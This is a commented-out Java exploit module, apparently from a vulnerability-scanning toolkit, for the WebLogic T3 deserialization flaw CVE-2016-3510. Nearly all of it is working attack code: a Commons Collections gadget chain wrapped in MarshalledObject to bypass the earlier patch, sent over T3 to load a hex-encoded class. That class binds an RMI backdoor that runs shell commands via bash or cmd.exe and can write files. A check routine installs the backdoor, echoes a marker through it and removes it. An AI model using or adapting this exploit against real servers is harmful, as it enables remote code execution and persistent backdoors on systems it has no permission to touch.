//package com.artillery.payloads;
//
//
//import com.artplugin.T3Protocol;
//import com.artplugin.network.ssl.WeblogicTrustManager;
//import com.artplugin.util.Reflections;
//import com.artplugin.util.Serializables;
//import org.apache.commons.collections.Transformer;
//import org.apache.commons.collections.functors.ChainedTransformer;
//import org.apache.commons.collections.functors.ConstantTransformer;
//import org.apache.commons.collections.functors.InvokerTransformer;
//import org.apache.commons.collections.map.LazyMap;
//import org.mozilla.classfile.DefiningClassLoader;
//import weblogic.cluster.singleton.ClusterMasterRemote;
//import weblogic.corba.utils.MarshalledObject;
//import weblogic.jndi.Environment;
//
//import java.io.*;
//import java.lang.reflect.InvocationHandler;
//import java.lang.reflect.Proxy;
//import java.net.URL;
//import java.util.HashMap;
//import java.util.HashSet;
//import javax.naming.Context;
//import javax.naming.NamingException;
//import java.util.Map;
//import static com.artplugin.util.BytesOperation.hexStringToBytes;
//
//public class CVE_2016_3510 {
//
//    private String name = "weblogic T3反序列化(CVE-2016-3510)";
//    private String descript = "CVE-2015-4852的补丁绕过(MarshalledObject)";
//    private String code = "CVE-2016-3510";
//    private String result = "未知错误";
//    private String expArgs = "{\"target\":\"http://127.0.0.1:7001\",\"command\":\"echo \"test\"}";
//    public CVE_2016_3510() {
//    }
//
//    public String Check(String target) throws Exception {
//
//        URL url = new URL(target);
//        //  绑定rmi实例
//        String t3Url;
//        Boolean ishttp;
//        if(url.getProtocol().equals("https")){
//            ishttp = true;
//            t3Url = "t3s://"+url.getHost()+":"+url.getPort();
//        }else{
//            ishttp = false;
//            t3Url = "t3://"+url.getHost()+":"+url.getPort();
//        }
//
//        RmiInterfaceHelper(ishttp,url.getHost(),String.valueOf(url.getPort()),new String[]{"install"});
//
//        System.out.println("执行命令：echo \"mejbmejb_jarMejb_Do\"");
//        Context initialContext = getInitialContext(t3Url);
//        ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup("mejbmejb_jarMejb_Do");
//        String res = remoteCode.getServerLocation("2c5f64ab07ccb3e410aa97fc09687cc3echo \"mejbmejb_jarMejb_Do\"");
//        System.out.println("回显："+res);
//
//        //解除绑定
//        RmiInterfaceHelper(ishttp,url.getHost(),String.valueOf(url.getPort()),new String[]{"uninstall"});
//
//        //判断存在ssrf
//        if(res.contains("mejbmejb_jarMejb_Do")){
//            result = "存在weblogic T3反序列化(CVE-2016-3510)";
//
//        }else{
//            result =  "未发现weblogic T3反序列化(CVE-2016-3510)";
//        }
//        return result;
//
//    }
//
//    public static Context getInitialContext(String url) throws NamingException, FileNotFoundException {
//        Environment environment = new Environment();
//        environment.setProviderUrl(url);
//        environment.setEnableServerAffinity(true);
//        environment.setSSLClientTrustManager(new WeblogicTrustManager());
//        return environment.getInitialContext();
//    }
//
//    public static Object selectBypass(Object payload) throws Exception {
//
//        payload = marshalledObject(payload);
//        return payload;
//    }
//    public static void RmiInterfaceHelper(Boolean ishttp,String host ,String port,String[] bootArgs) throws Exception {
//        // common-collection1 构造transformers 定义自己的RMI接口
//        String remoteHex = "cafebabe0000003200b00a003500510700520a000200510800530a005400550a000200560700570a000700510800580800590b005a005b08005c0b005a005d07005e07005f0a000f00600a000f00610a000f00620a000f00630800640a005400650800660a005400670800680a0069006a0a0054006b08006c0a0054006d07006e0a001d005108006f0b007000710800720800730800740800750700760a002500770a002500780a0025007907007a07007b0a007c007d0a002a007e0a0029007f0700800a002e00510a002900810a002e00820800830a002e00840a000e00850700860700870100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100046d61696e010016285b4c6a6176612f6c616e672f537472696e673b295601000d537461636b4d61705461626c6507005207008807005e0100117365745365727665724c6f636174696f6e010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f537472696e673b295601000a457863657074696f6e7307008901000a75706c6f616446696c65010017284c6a6176612f6c616e672f537472696e673b5b4229560100116765745365727665724c6f636174696f6e010026284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e673b07008a07008b07007607008c07007a07008001000a536f7572636546696c6501001452656d6f74654d4265616e496d706c2e6a6176610c0037003801001c636f6d2f6d656a622f726d692f52656d6f74654d4265616e496d706c010005626c696e6407008a0c008d008e0c0047004801001b6a617661782f6e616d696e672f496e697469616c436f6e74657874010007696e7374616c6c0100136d656a626d656a625f6a61724d656a625f446f0700880c008f0090010009756e696e7374616c6c0c009100920100136a6176612f6c616e672f457863657074696f6e0100186a6176612f696f2f46696c654f757470757453747265616d0c003700920c009300940c009500380c0096003801002032633566363461623037636362336534313061613937666330393638376363330c0097008e0100056572726f720c009800990100076f732e6e616d6507009a0c009b00480c009c009d01000377696e0c009e009f0100136a6176612f7574696c2f41727261794c697374010004244e4f2407008b0c00a000a10100092f62696e2f626173680100022d63010007636d642e6578650100022f630100186a6176612f6c616e672f50726f636573734275696c6465720c003700a20c00a300a40c00a500a60100166a6176612f696f2f42756666657265645265616465720100196a6176612f696f2f496e70757453747265616d52656164657207008c0c00a700a80c003700a90c003700aa0100166a6176612f6c616e672f537472696e674275666665720c00ab009d0c00ac00ad0100010a0c00ae009d0c00af009d0100106a6176612f6c616e672f4f626a65637401002e7765626c6f6769632f636c75737465722f73696e676c65746f6e2f436c75737465724d617374657252656d6f74650100146a617661782f6e616d696e672f436f6e746578740100186a6176612f726d692f52656d6f7465457863657074696f6e0100106a6176612f6c616e672f537472696e6701000e6a6176612f7574696c2f4c6973740100116a6176612f6c616e672f50726f63657373010010657175616c7349676e6f726543617365010015284c6a6176612f6c616e672f537472696e673b295a010006726562696e64010027284c6a6176612f6c616e672f537472696e673b4c6a6176612f6c616e672f4f626a6563743b2956010006756e62696e64010015284c6a6176612f6c616e672f537472696e673b29560100057772697465010005285b422956010005666c757368010005636c6f736501000a73746172747357697468010009737562737472696e670100152849294c6a6176612f6c616e672f537472696e673b0100106a6176612f6c616e672f53797374656d01000b67657450726f706572747901000b746f4c6f7765724361736501001428294c6a6176612f6c616e672f537472696e673b010008636f6e7461696e7301001b284c6a6176612f6c616e672f4368617253657175656e63653b295a010003616464010015284c6a6176612f6c616e672f4f626a6563743b295a010013284c6a6176612f7574696c2f4c6973743b295601001372656469726563744572726f7253747265616d01001d285a294c6a6176612f6c616e672f50726f636573734275696c6465723b010005737461727401001528294c6a6176612f6c616e672f50726f636573733b01000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b010018284c6a6176612f696f2f496e70757453747265616d3b2956010013284c6a6176612f696f2f5265616465723b2956010008726561644c696e65010006617070656e6401002c284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f537472696e674275666665723b010008746f537472696e6701000a6765744d6573736167650021000200350001003600000005000100370038000100390000001d00010001000000052ab70001b100000001003a0000000600010000000e0009003b003c00010039000000c90003000300000061bb000259b700034c2abe05a000192a03321204b6000599000e2b2a0432b6000657a7003b2abe04a00035bb000759b700084d2a03321209b6000599000f2c120a2bb9000b0300a700162a0332120cb6000599000b2c120ab9000d0200a700044cb100010000005c005f000e0002003a00000032000c00000013000800150019001600240017002a001800320019003d001a0049001b0054001c005c0021005f001f00600022003d000000160005fc002407003efc002407003ff90012420700400000010041004200020039000000190000000300000001b100000001003a00000006000100000028004300000004000100440009004500460001003900000060000300030000001bbb000f592ab700104d2c2bb600112cb600122cb60013a700044db10001000000160019000e0002003a0000001e00070000002c0009002d000e002e0012002f0016003200190030001a0033003d000000070002590700400000010047004800020039000001cc0005000a000000ee2b1214b600159a00061216b02b1020b600174c043d1218b800194e2dc600112db6001a121bb6001c990005033dbb001d59b7001e3a042b121fb6001599001319042b07b60017b90020020057a700441c99002319041221b9002002005719041222b9002002005719042bb90020020057a7002019041223b9002002005719041224b9002002005719042bb90020020057bb0025591904b700263a05190504b60027571905b600283a06bb002959bb002a591906b6002bb7002cb7002d3a07bb002e59b7002f3a081907b60030593a09c6001319081909b600311232b6003157a7ffe81908b60033b04d2cb60034b000020000000b00e8000e000c00e700e8000e0002003a0000006e001b0000003a0009003b000c003d0013004000150041001b0042002b0043002d004600360048003f0049004f004a0053004b005d004c0067004d0073004f007d00500087005100900054009b005500a2005600a9005800be005900c7005c00d2005d00e2006000e8006100e90062003d0000004800080cfd002001070049fc002107004a231cff0036000907003e0700490107004907004a07004b07004c07004d07004e0000fc001a070049ff0005000207003e0700490001070040004300000004000100440001004f000000020050";
//        byte[] bs =  hexStringToBytes(remoteHex);
//        String className = "com.mejb.rmi.RemoteMBeanImpl";
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(DefiningClassLoader.class),
//                new InvokerTransformer("getDeclaredConstructor", new Class[]{Class[].class}, new Object[]{new Class[0]}),
//                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[0]}),
//                new InvokerTransformer("defineClass",
//                        new Class[]{String.class, byte[].class}, new Object[]{className, bs}),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"main", new Class[]{String[].class}}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{bootArgs}}),
//                new ConstantTransformer(new HashSet())};
//        final Transformer transformerChain = new ChainedTransformer(transformers);
//
//
//        final Map innerMap = new HashMap();
//        // 初始化map 设置laymap
//        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
//
//        InvocationHandler handler = (InvocationHandler) Reflections
//                .getFirstCtor(
//                        "sun.reflect.annotation.AnnotationInvocationHandler")
//                .newInstance(Override.class, lazyMap);
//
//        final Map mapProxy = Map.class
//                .cast(Proxy.newProxyInstance(Map.class.getClassLoader(),
//                        new Class[]{Map.class}, handler));
//
//        handler = (InvocationHandler) Reflections.getFirstCtor(
//                "sun.reflect.annotation.AnnotationInvocationHandler")
//                .newInstance(Override.class, mapProxy);
//        Object _handler = selectBypass(handler);
//        byte[] payload  = Serializables.serialize(_handler);
//        T3Protocol.send(ishttp,host,port,payload);
//    }
//    private static Object marshalledObject(Object payload) {
//        MarshalledObject marshalledObject = null;
//        try {
//            marshalledObject = new MarshalledObject(payload);
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
//        return marshalledObject;
//    }
//
//    public static void main(String[] args) throws Exception {
//        CVE_2016_3510 test = new CVE_2016_3510();
//        String res = test.Check("http://127.0.0.1:7001");
//        System.out.println(res);
//    }
//}
